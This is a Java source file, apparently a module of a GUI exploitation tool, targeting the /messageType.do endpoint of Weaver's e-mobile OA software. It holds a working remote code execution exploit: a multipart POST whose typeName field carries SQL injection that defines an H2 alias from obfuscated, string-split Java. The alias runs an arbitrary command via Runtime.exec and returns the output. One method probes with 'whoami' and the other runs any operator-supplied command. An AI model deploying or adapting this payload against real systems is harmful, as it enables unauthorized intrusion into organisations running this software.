package exp.oa.weaveroa.emobile;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

public class weaver_em_messageType_rce implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n ");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {

        return attcmd(url, cmd, textArea, textArea_cmd);
    }
    private Boolean att(String url, TextArea textArea) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("Content-Type","multipart/form-data;boundary=----WebKitFormBoundaryTm8YXcJeyKDClbU7");
            head.put("Accept-Encoding","gzip, deflate");
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36");
            String payload = "------WebKitFormBoundaryTm8YXcJeyKDClbU7\r\n" +
                    "Content-Disposition: form-data; name=\"method\"\r\n" +
                    "\r\n" +
                    "create\r\n" +
                    "------WebKitFormBoundaryTm8YXcJeyKDClbU7\r\n" +
                    "Content-Disposition: form-data; name=\"typeName\"\r\n" +
                    "\r\n" +
                    "1';CREATE ALIAS if not exists MzSNqKsZTagm AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass(\"com.caucho.server.dispatch.ServletInvocation\").getMet','hod(\"getContextRequest\").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField(\"_response\");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod(\"getWriter\");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter(\"\\\\A\");writer.write(scan','ner.hasNext()?sca','nner.next():\"\");}');CALL MzSNqKsZTagm('whoami');--\r\n" +
                    "------WebKitFormBoundaryTm8YXcJeyKDClbU7--";
            Response post_res = HttpTools.post(url + "/messageType.do" ,payload, head, "utf-8");
            if (post_res.getCode() == 200 && post_res.getText().contains("\\") && post_res.getText().contains("错误")) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ weaver_ec_messageType_rce ]");
                    textArea.appendText("\n 该漏洞RCE利用不稳定");
                    textArea.appendText("\n");
                });


                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
    private Boolean attcmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("Content-Type","multipart/form-data;boundary=----WebKitFormBoundaryTm8YXcJeyKDClbU7");
            head.put("Accept-Encoding","gzip, deflate");
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36");
            String payload = "------WebKitFormBoundaryTm8YXcJeyKDClbU7\r\n" +
                    "Content-Disposition: form-data; name=\"method\"\r\n" +
                    "\r\n" +
                    "create\r\n" +
                    "------WebKitFormBoundaryTm8YXcJeyKDClbU7\r\n" +
                    "Content-Disposition: form-data; name=\"typeName\"\r\n" +
                    "\r\n" +
                    "1';CREATE ALIAS if not exists MzSNqKsZTagm AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass(\"com.caucho.server.dispatch.ServletInvocation\").getMet','hod(\"getContextRequest\").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField(\"_response\");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod(\"getWriter\");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter(\"\\\\A\");writer.write(scan','ner.hasNext()?sca','nner.next():\"\");}');CALL MzSNqKsZTagm('"+cmd+"');--\r\n" +
                    "------WebKitFormBoundaryTm8YXcJeyKDClbU7--";
            Response post_res = HttpTools.post(url + "/messageType.do" ,payload, head, "utf-8");

            if (post_res.getCode() == 200 && !post_res.getText().contains("false") ) {
                List<String> echoList = new ArrayList<>();
                String[] lines = post_res.getText().split("\r\n");
                for (int i = 0; i < lines.length - 1; i++) {
                    echoList.add(lines[i]);
                }
                String result = String.join("\n", echoList);
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 执行成功！");
                    textArea_cmd.appendText("\n"+result);
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 执行失败！");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
